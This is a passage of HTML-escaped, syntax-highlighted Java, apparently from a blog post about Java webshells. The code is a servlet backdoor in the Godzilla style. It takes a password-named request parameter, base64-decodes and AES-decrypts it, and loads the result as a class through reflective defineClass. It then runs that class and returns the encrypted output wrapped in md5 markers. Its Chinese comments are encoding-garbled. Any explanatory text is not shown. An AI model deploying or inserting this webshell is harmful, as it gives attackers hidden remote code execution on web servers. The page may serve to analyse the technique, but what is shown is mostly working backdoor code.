string&quot;&gt;&quot;decodeBuffer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;  
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Cipher&lt;/span&gt; c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Cipher&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;AES&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xc&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;AES&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//æ ¹æ®mçš„å€¼åˆ¤æ–­æ˜¯åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼Œmæ˜¯trueçš„æ—¶å€™å˜é‡ä¸º1ï¼Œè¿™æ—¶å€™è¡¨ç¤ºåŠ å¯†æ¨¡å¼ï¼Œåä¹‹æ˜¯è§£å¯†æ¨¡å¼&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;doFinal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt; urlClassLoader &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; URL&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;currentThread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; defMethod &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;defineClass&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        defMethod&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; defMethod&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;urlClassLoader&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doPost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletRequest&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HttpServletResponse&lt;/span&gt; resp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pass&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;  
                payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;//ç”¨äºç¬¬ä¸€æ¬¡æ¥å—è¯·æ±‚åˆå§‹åŒ–payload&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ByteArrayOutputStream&lt;/span&gt; arrOut &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//                Object f = payload.newInstance(); &lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;basic.payload&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//æœ¬åœ°åŠ è½½payloadï¼Œç”¨äºåŠ¨æ€è°ƒè¯•&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;md5&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toByteArray&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;md5&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&g